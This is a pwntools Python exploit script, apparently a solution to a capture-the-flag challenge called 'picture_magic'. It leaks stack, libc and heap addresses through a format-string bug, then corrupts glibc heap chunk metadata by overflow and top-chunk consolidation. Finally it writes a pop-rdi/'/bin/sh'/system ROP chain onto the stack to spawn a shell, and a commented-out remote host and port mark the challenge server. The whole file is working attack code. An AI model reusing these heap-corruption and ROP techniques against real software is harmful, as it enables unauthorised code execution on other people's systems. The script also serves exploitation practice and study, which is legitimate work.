#!/usr/bin/python3

from pwn import *

exe = ELF("picture_magic", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.36.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "INFO"
# context.log_level 	= "DEBUG"
isDebug = False

# brva 0x0000000000001DDF return area of sell_picture
# brva 0x0000000000001F32 fgets the artist_name buffer
# brva 0x0000000000001FDD setting artist name
# break create_picture
# break sell_picture
# break malloc.c:4597
gs = '''
directory /opt/GLIBC_SOURCE_CODE/
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def extract_leaked_address(leak_line):
	# Ensure the input is a string
	if isinstance(leak_line, bytes):
		leak_line = leak_line.decode()

	# Use regular expressions to extract the numbers
	import re
	match = re.search(r'Chosen size of \((\d+), (\d+)\) cannot', leak_line)
	# input("Before checking RE...")
	if not match:
		raise ValueError("Leak line does not match expected format.")

	# Extract the numbers
	num1 = int(match.group(1))  # First number (e.g., 3116330176)
	num2 = int(match.group(2))  # Second number (e.g., 32604)

	# Convert to hexadecimal
	hex_num1 = num1 & 0xFFFFFFFF  # Ensure it fits in 4 bytes
	hex_num2 = num2 & 0xFFFF      # Ensure it fits in 2 bytes

	# Concatenate: first the small number, then the second
	address = (hex_num2 << 32) | hex_num1

	return address

def calculate_transform_values(start_value, target_value):
    # Convert start_value and target_value into 8-byte arrays (little-endian order)
    start_bytes = [(start_value >> (8 * i)) & 0xff for i in range(8)]
    target_bytes = [(target_value >> (8 * i)) & 0xff for i in range(8)]
    
    # Calculate the transform values needed for each byte using modulo 256
    transform_values = [(target_bytes[i] - start_bytes[i]) & 0xff for i in range(8)]
    
    return transform_values
		
def create_picture(width: int, height: int, single_row_content=b"a"):
	global picture_index
	io.sendlineafter(b"-> ", b"1")
	io.sendlineafter(b"Width: ", str(width).encode())
	io.sendlineafter(b"Height: ", str(height).encode())
	for _ in range(height):
		smallresult = io.recvS()
		# print(smallresult)
		io.sendline(single_row_content)
	
	result = io.recvS()
	# print(result)

def create_picture_and_leak_libc() -> int:
	io.sendlineafter(b"-> ", b"1")
	io.sendlineafter(b"Width: ", b".")
	io.sendlineafter(b"Height: ", b".")
	io.recvline()
	result = io.recvuntil(b" cannot")
	leaked_address = extract_leaked_address(result)
	libc.address = leaked_address - 0x1f6cc0
	print(f"{hex(libc.address)=}")

def create_picture_and_leak_heap() -> int:
	io.sendlineafter(b"-> ", b"1")
	io.sendlineafter(b"Width: ", b"%")
	io.sendlineafter(b"Height: ", b"%")
	io.recvline()
	result = io.recvuntil(b" cannot")
	heap_leaked_address = extract_leaked_address(result)
	heap_base = heap_leaked_address- 0x290;
	return heap_base

def transform_picture(index: int, transform_type:str, transform_size:int, transform_row:int, transform_col:int):
	io.sendlineafter(b"-> ", b"2")
	io.sendlineafter(b"Picture index: ", str(index).encode())
	io.sendlineafter(b"(mul/add/sub/div): ", transform_type.encode())
	io.sendlineafter(b"Transformation size: ", str(transform_size).encode())
	io.sendlineafter(b"Transformation row (-1 for all): ", str(transform_row).encode())
	io.sendlineafter(b"Transformation column (-1 for all): ", str(transform_col).encode())
	result = io.recvS()
	# print(result)


def show_picture(index: int):
	io.sendlineafter(b"-> ", b"3")
	io.sendlineafter(b"Picture index: ", str(index).encode())
	result = io.recvS()
	# print(result)

def sell_picture_dots_path(index: int, price:bytes=b"%p", free_it:bool = False) -> bytes:
	# needed when we want to pass a '%p' as price. This will print out a stack address.
	io.sendlineafter(b"-> ", b"4")
	io.sendlineafter(b"Picture index: ", str(index).encode())
	io.sendlineafter(b"the picture for? ", price)
	result = io.recv()
	# print(io.recv())
	io.sendline(b"y" if free_it else b"N")
	
	sleep(1)
	print(io.recvS())

	sleep(1)
	print(io.recvS())

	sleep(1)
	print(io.recvS())
	sleep(1)
	
	return result

def sell_picture_quick_path(index: int, free_it:bool = False):
	io.sendlineafter(b"-> ", b"4")
	io.sendlineafter(b"Picture index: ", str(index).encode())
	io.sendlineafter(b"the picture for? ", b"0")
	result = io.recv()
	# print(result)

def change_artist_name(new_name:bytes, sendLine=True):
	io.sendlineafter(b"-> ", b"5")
	if sendLine: io.sendlineafter(b"artist name: ", new_name)
	else: io.sendafter(b"artist name: ", new_name)
	result = io.recvS()
	# print(result)

def exit_program():
	io.sendlineafter(b"-> ", b"6")

def extract_leak(leak: bytes) -> int:
	split1 = leak.split(b"\n")
	split2 = split1[1].split(b"$")
	dirty_leak = split2[1][:-1]
	leaked_address = int(dirty_leak.decode(), 16)
	print(f"Leaked address: {hex(leaked_address)}")
	return leaked_address

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
io = start_local(isDebug)
io.timeout=0.02

######## REMOTE ########
# io = remote("83.136.254.158", 52398)
# io.timeout=1
io.sendlineafter(b": ", b"")

# leak stack...
create_picture(height=0x1, width=0x1, single_row_content=b" " * 0x1)
jump_value = sell_picture_dots_path(index=0, free_it=True)
leaked_address = extract_leak(leak=jump_value)
sell_picture_saved_ret = leaked_address+0x2148
artist_name_on_stack = leaked_address+0x2160
print(f"{hex(sell_picture_saved_ret)=}")
print(f"{hex(artist_name_on_stack)=}")

# leak libc...
create_picture(height=0x1, width=0x4e8, single_row_content=b"\x01" * 0x4e8)
create_picture(height=0x1, width=0x4e8, single_row_content=b"\x01" * 0x4e8)
sell_picture_quick_path(index=0, free_it=True)
create_picture_and_leak_libc()
# after leaking libc.

# leak heap...
create_picture(height=0x1, width=0x4e8, single_row_content=b"\x01" * 0x4e8)
create_picture(height=0x1, width=0x4e8, single_row_content=b"\x01" * 0x4e8)
create_picture(height=0x1, width=0x4e8, single_row_content=b"\x01" * 0x4e8)
sell_picture_quick_path(index=0, free_it=True)
sell_picture_quick_path(index=2, free_it=True)
sell_picture_quick_path(index=3, free_it=True)
create_picture(height=0x1, width=0x4e8, single_row_content=b"\x01" * 0x4e8)
heap_base = create_picture_and_leak_heap()
print(f"{hex(heap_base)=}")
# after leaking heap.

# clean up...
sell_picture_quick_path(index=0, free_it=True)
sell_picture_quick_path(index=1, free_it=True)

############# exploit ################
# first, we overflow chunk A and set chunk B's size to 0x500.
create_picture(height=0x1, width=0x4e8, single_row_content=b"\x01" * 0x4f0)
create_picture(height=0x1, width=0x4e8, single_row_content=b"\x01" * 0x4f0)
sell_picture_quick_path(index=0, free_it=True)
create_picture(height=0x1, width=0x4f0, single_row_content=b"\x01" * 0x4f0)

jump_value = (heap_base + 0x790) - artist_name_on_stack
# Convert the result to a 64-bit two's complement if negative
if jump_value < 0:
    jump_value = (1 << 64) + jump_value

print(f"{hex(jump_value)=}")

transform_values = calculate_transform_values(0x0a01010101010101, jump_value)

payload = flat(
	p64(0x0),
	p64(jump_value),
	p64(artist_name_on_stack),
	p64(artist_name_on_stack),
	p64(0)
)

change_artist_name(new_name=payload)

transform_picture(index=0, transform_type="add", transform_size=transform_values[0], transform_row=0x0, transform_col=0x4e8)
transform_picture(index=0, transform_type="add", transform_size=transform_values[1], transform_row=0x0, transform_col=0x4e9)
transform_picture(index=0, transform_type="add", transform_size=transform_values[2], transform_row=0x0, transform_col=0x4ea)
transform_picture(index=0, transform_type="add", transform_size=transform_values[3], transform_row=0x0, transform_col=0x4eb)
transform_picture(index=0, transform_type="add", transform_size=transform_values[4], transform_row=0x0, transform_col=0x4ec)
transform_picture(index=0, transform_type="add", transform_size=transform_values[5], transform_row=0x0, transform_col=0x4ed)
transform_picture(index=0, transform_type="add", transform_size=transform_values[6], transform_row=0x0, transform_col=0x4ee)
transform_picture(index=0, transform_type="add", transform_size=transform_values[7], transform_row=0x0, transform_col=0x4ef)

# Consolidate chunk B with chunk A and then the top chunk, corrupting the top_chunk's location
sell_picture_quick_path(index=1, free_it=True)

pop_rdi = libc.address + 0x0000000000023b65
bin_sh = libc.address + 0x1b61b4
system = libc.sym["system"]
rop_start = artist_name_on_stack + 0x18

print(f"{hex(pop_rdi)=}")
print(f"{hex(bin_sh)=}")
print(f"{hex(system)=}")
# print(f"{hex(rop_start)=}")
print("Exploiting... please wait.")

payload = flat(
	p64(0),
	p64(0x601),
)

change_artist_name(new_name=payload, sendLine=True)
create_picture(height=0x0, width=0x0, single_row_content=b"")

payload = flat(
	p64(0),
	p64(0x501),
	p32(0x4e8),
	p32(0x1)
)

change_artist_name(new_name=payload, sendLine=True)

# "zero" out the first input
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=48)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=49)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=50)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=51)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=52)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=53)

# "zero" out the second input
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=56)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=57)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=58)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=59)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=60)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=61)

# "zero" out the third input
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=64)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=65)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=66)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=67)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=68)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=69)

# "zero" out the fourth input
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=72)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=73)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=74)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=75)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=76)
transform_picture(index=1, transform_type="mul", transform_size=0, transform_row=0x0, transform_col=77)


transform_values_ret = transform_values = calculate_transform_values(0x0000202020202020, pop_rdi+1)
transform_picture(index=1, transform_type="add", transform_size=transform_values_ret[0], transform_row=0x0, transform_col=48)
transform_picture(index=1, transform_type="add", transform_size=transform_values_ret[1], transform_row=0x0, transform_col=49)
transform_picture(index=1, transform_type="add", transform_size=transform_values_ret[2], transform_row=0x0, transform_col=50)
transform_picture(index=1, transform_type="add", transform_size=transform_values_ret[3], transform_row=0x0, transform_col=51)
transform_picture(index=1, transform_type="add", transform_size=transform_values_ret[4], transform_row=0x0, transform_col=52)
transform_picture(index=1, transform_type="add", transform_size=transform_values_ret[5], transform_row=0x0, transform_col=53)

transform_values_rdi = transform_values = calculate_transform_values(0x0000202020202020, pop_rdi)
transform_picture(index=1, transform_type="add", transform_size=transform_values_rdi[0], transform_row=0x0, transform_col=56)
transform_picture(index=1, transform_type="add", transform_size=transform_values_rdi[1], transform_row=0x0, transform_col=57)
transform_picture(index=1, transform_type="add", transform_size=transform_values_rdi[2], transform_row=0x0, transform_col=58)
transform_picture(index=1, transform_type="add", transform_size=transform_values_rdi[3], transform_row=0x0, transform_col=59)
transform_picture(index=1, transform_type="add", transform_size=transform_values_rdi[4], transform_row=0x0, transform_col=60)
transform_picture(index=1, transform_type="add", transform_size=transform_values_rdi[5], transform_row=0x0, transform_col=61)

transform_values_bin_sh = transform_values = calculate_transform_values(0x0000202020202020, bin_sh)
transform_picture(index=1, transform_type="add", transform_size=transform_values_bin_sh[0], transform_row=0x0, transform_col=64)
transform_picture(index=1, transform_type="add", transform_size=transform_values_bin_sh[1], transform_row=0x0, transform_col=65)
transform_picture(index=1, transform_type="add", transform_size=transform_values_bin_sh[2], transform_row=0x0, transform_col=66)
transform_picture(index=1, transform_type="add", transform_size=transform_values_bin_sh[3], transform_row=0x0, transform_col=67)
transform_picture(index=1, transform_type="add", transform_size=transform_values_bin_sh[4], transform_row=0x0, transform_col=68)
transform_picture(index=1, transform_type="add", transform_size=transform_values_bin_sh[5], transform_row=0x0, transform_col=69)

transform_values_system = transform_values = calculate_transform_values(0x0000202020202020, system)
transform_picture(index=1, transform_type="add", transform_size=transform_values_system[0], transform_row=0x0, transform_col=72)
transform_picture(index=1, transform_type="add", transform_size=transform_values_system[1], transform_row=0x0, transform_col=73)
transform_picture(index=1, transform_type="add", transform_size=transform_values_system[2], transform_row=0x0, transform_col=74)
transform_picture(index=1, transform_type="add", transform_size=transform_values_system[3], transform_row=0x0, transform_col=75)
transform_picture(index=1, transform_type="add", transform_size=transform_values_system[4], transform_row=0x0, transform_col=76)
transform_picture(index=1, transform_type="add", transform_size=transform_values_system[5], transform_row=0x0, transform_col=77)
pause()

exit_program()
io.interactive()
